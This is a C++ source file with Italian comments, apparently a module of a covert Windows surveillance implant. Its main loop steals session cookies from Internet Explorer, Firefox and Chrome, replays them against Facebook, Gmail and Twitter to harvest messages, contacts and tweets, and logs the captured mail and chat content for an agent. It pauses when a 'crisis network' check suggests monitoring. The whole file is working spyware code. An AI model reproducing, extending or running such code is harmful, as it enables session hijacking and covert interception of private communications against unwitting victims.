
#define SLEEP_COOKIE 30 // In secondi
#define SOCIAL_LONG_IDLE 20 // In multipli di SLEEP_COOKIE (10 minuti)
#define SOCIAL_SHORT_IDLE 4 // In multipli di SLEEP_COOKIE (2 minuti)

#define _CRT_SECURE_NO_WARNINGS 1
#include <windows.h>
#include <stdio.h>
#include <string>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "..\JSON\JSON.h"
#include "..\bin_string.h"
#include "CookieHandler.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

extern DWORD HandleGMail(char *); // Handler per GMail
extern DWORD HandleFBMessages(char *); // Handler per FaceBook
extern DWORD HandleFBContacts(char *); // Handler per FaceBook
extern DWORD HandleTwitterContacts(char *); // Handler per Twitter
extern DWORD HandleTwitterTweets(char *); // Handler per Twitter
extern int DumpFFCookies(void); // Cookie per Facebook
extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
extern int DumpCHCookies(void); // Cookie per Chrome

extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
extern BOOL IsCrisisNetwork();
extern DWORD social_process_control; // Variabile per il controllo del processo. Dichiarata nell'agente principale

extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_MailCapStarted;
extern BOOL bPM_ContactsStarted;

social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];

// Simple ascii url decode
void urldecode(char *src)
{
	char *dest = src;
	char code[3] = {0};
	unsigned long ascii = 0;
	char *end = NULL;

	while(*src) {
		if(*src=='\\' && *(src+1)=='u') {
			src+=4;
			memcpy(code, src, 2);
			ascii = strtoul(code, &end, 16);
			*dest++ = (char)ascii;
			src += 2;
		} else
			*dest++ = *src++;
	}
	*dest = 0;
}

void JsonDecode(char *string)
{
	WCHAR *string_16, *ptr;
	DWORD size;
	std::wstring decode_16=L"";

	size = strlen(string);
	ptr = string_16 = UTF8_2_UTF16(string);
	if (!string_16) 
		return;
	JSON::ExtractString((const wchar_t **)&string_16, decode_16);
	if (wcslen(decode_16.c_str())>0)
		WideCharToMultiByte(CP_UTF8, 0, decode_16.c_str(), -1, string, size, 0 , 0);
	SAFE_FREE(ptr);
}

void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming)
{
	HANDLE hf;
	char *raw_mail;
	DWORD field_len;
	struct MailSerializedMessageHeader additional_header;
	
	field_len = strlen(from) + strlen(rcpt) + strlen(cc) + strlen(subject) + strlen(body) + 256;
	raw_mail = (char *)malloc(field_len);
	if (!raw_mail)
		return;
	_snprintf_s(raw_mail, field_len, _TRUNCATE, "From: %s\r\nTo: %s\r\nCC: %s\r\nSubject: %s\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n%s", from, rcpt, cc, subject, body);

	ZeroMemory(&additional_header, sizeof(additional_header));
	additional_header.Size = strlen(raw_mail);
	additional_header.Flags |= MAIL_FULL_BODY;
	if (is_incoming)
		additional_header.Flags |= MAIL_INCOMING;
	else
		additional_header.Flags |= MAIL_OUTGOING;
	additional_header.Program = program;
	additional_header.VersionFlags = MAPI_V3_0_PROTO;

	// XXX Devo settare la data
	//additional_header.date.dwHighDateTime = mail_date->dwHighDateTime;
	//additional_header.date.dwLowDateTime = mail_date->dwLowDateTime;

	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
	Log_WriteFile(hf, (BYTE *)raw_mail, additional_header.Size);
	Log_CloseFile(hf); 

	SAFE_FREE(raw_mail);
	return;
}

void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming)
{
	HANDLE hf;
	struct MailSerializedMessageHeader additional_header;
	
	ZeroMemory(&additional_header, sizeof(additional_header));
	additional_header.Size = size;
	additional_header.Flags |= MAIL_FULL_BODY;
	if (is_incoming)
		additional_header.Flags |= MAIL_INCOMING;
	else
		additional_header.Flags |= MAIL_OUTGOING;
	additional_header.Program = program;
	additional_header.VersionFlags = MAPI_V3_0_PROTO;

	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
	Log_WriteFile(hf, (BYTE *)raw_mail, additional_header.Size);
	Log_CloseFile(hf); 

	return;
}

void LogSocialIMMessageA(DWORD program, char *peers, char *peers_id, char *author, char *author_id, char *body, struct tm *tstamp, BOOL is_incoming) 
{
	WCHAR *peers_w;
	WCHAR *author_w;
	WCHAR *peers_id_w;
	WCHAR *author_id_w;
	WCHAR *body_w;

	peers_w = UTF8_2_UTF16(peers);
	author_w = UTF8_2_UTF16(author);
	peers_id_w = UTF8_2_UTF16(peers_id);
	author_id_w = UTF8_2_UTF16(author_id);
	body_w = UTF8_2_UTF16(body);

	LogSocialIMMessageW(program, peers_w, peers_id_w, author_w, author_id_w, body_w, tstamp, is_incoming); 

	SAFE_FREE(peers_w);
	SAFE_FREE(author_w);
	SAFE_FREE(peers_id_w);
	SAFE_FREE(author_id_w);
	SAFE_FREE(body_w);
}

void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WCHAR *author, WCHAR *author_id, WCHAR *body, struct tm *tstamp, BOOL is_incoming) 
{
	bin_buf tolog;
	DWORD delimiter = ELEM_DELIMITER;
	DWORD flags = 0;

	if (is_incoming)
		flags |= 0x01;

	if (program && peers && body && author && peers_id && author_id) {
		tolog.add(tstamp, sizeof(struct tm));
		tolog.add(&program, sizeof(DWORD));
		tolog.add(&flags, sizeof(DWORD));
		tolog.add(author_id, (wcslen(author_id)+1)*sizeof(WCHAR));
		tolog.add(author, (wcslen(author)+1)*sizeof(WCHAR));
		tolog.add(peers_id, (wcslen(peers_id)+1)*sizeof(WCHAR));
		tolog.add(peers, (wcslen(peers)+1)*sizeof(WCHAR));
		tolog.add(body, (wcslen(body)+1)*sizeof(WCHAR));
		tolog.add(&delimiter, sizeof(DWORD));
		LOG_InitAgentLog(PM_IMAGENT_SOCIAL);
		LOG_ReportLog(PM_IMAGENT_SOCIAL, tolog.get_buf(), tolog.get_len());
		LOG_StopAgentLog(PM_IMAGENT_SOCIAL);
	}
}


void DumpNewCookies()
{
	ResetNewCookie();
	DumpIECookies(L"Microsoft\\Windows\\Cookies");
	DumpIECookies(L"Microsoft\\Windows\\Cookies\\Low");
	DumpFFCookies();
	DumpCHCookies();
}

void CheckProcessStatus()
{
	while(social_process_control == SOCIAL_PROCESS_PAUSE) 
		Sleep(500);
	if (social_process_control == SOCIAL_PROCESS_EXIT)
		ExitProcess(0);
}

void InitSocialEntries()
{
	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++) {
		social_entry[i].idle = 0;
		social_entry[i].is_new_cookie = FALSE;
		social_entry[i].wait_cookie = TRUE;
	}
	wcscpy_s(social_entry[0].domain, FACEBOOK_DOMAIN);
	social_entry[0].RequestHandler = HandleFBMessages;
	wcscpy_s(social_entry[1].domain, GMAIL_DOMAIN);
	social_entry[1].RequestHandler = HandleGMail;
	wcscpy_s(social_entry[2].domain, FACEBOOK_DOMAIN);
	social_entry[2].RequestHandler = HandleFBContacts;
	wcscpy_s(social_entry[3].domain, TWITTER_DOMAIN);
	social_entry[3].RequestHandler = HandleTwitterContacts;
	wcscpy_s(social_entry[4].domain, TWITTER_DOMAIN);
	social_entry[4].RequestHandler = HandleTwitterTweets;

	// Azzera i cookie in shared mem relativi a IExplorer
	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
	ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
	ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
}

void SocialMainLoop()
{
	DWORD i, ret;
	char *str;

	InitSocialEntries();
	SocialWinHttpSetup(L"http://www.facebook.com");
	LOG_InitSequentialLogs();

	for (;;) {
		// Busy wait...
		for (int j=0; j<SLEEP_COOKIE; j++) {
			Sleep(1000);
			CheckProcessStatus();
		}

		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted)
			continue;

		// Verifica se qualcuno e' in attesa di nuovi cookies
		// o se sta per fare una richiesta
		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
			// Se si, li dumpa
			if (social_entry[i].wait_cookie || social_entry[i].idle == 0) {
				DumpNewCookies();
				break;
			}
		}

		// Se stava aspettando un cookie nuovo
		// e c'e', allora esegue subito la richiesta
		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) 
			if (social_entry[i].wait_cookie && social_entry[i].is_new_cookie) {
				social_entry[i].idle = 0;
				social_entry[i].wait_cookie = FALSE;
			}
		
		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
			// Vede se e' arrivato il momento di fare una richiesta per 
			// questo social
			if (social_entry[i].idle == 0) { 
				char domain_a[64];
				CheckProcessStatus();
				_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);		
 				if (str = GetCookieString(domain_a)) {
					if (!IsCrisisNetwork() && social_entry[i].RequestHandler)
						ret = social_entry[i].RequestHandler(str);
					 else
						ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
					SAFE_FREE(str);

					if (ret == SOCIAL_REQUEST_SUCCESS) {
						social_entry[i].idle = SOCIAL_LONG_IDLE;
						social_entry[i].wait_cookie = FALSE;
					} else if (ret == SOCIAL_REQUEST_BAD_COOKIE) {
						social_entry[i].idle = SOCIAL_LONG_IDLE;
						social_entry[i].wait_cookie = TRUE;
					} else { // network problems...
						social_entry[i].idle = SOCIAL_SHORT_IDLE;
						social_entry[i].wait_cookie = TRUE;
					}
				} else { // no cookie = bad cookie
					social_entry[i].idle = SOCIAL_LONG_IDLE;
					social_entry[i].wait_cookie = TRUE;
				}
			} else 
				social_entry[i].idle--;
		}
	}
}

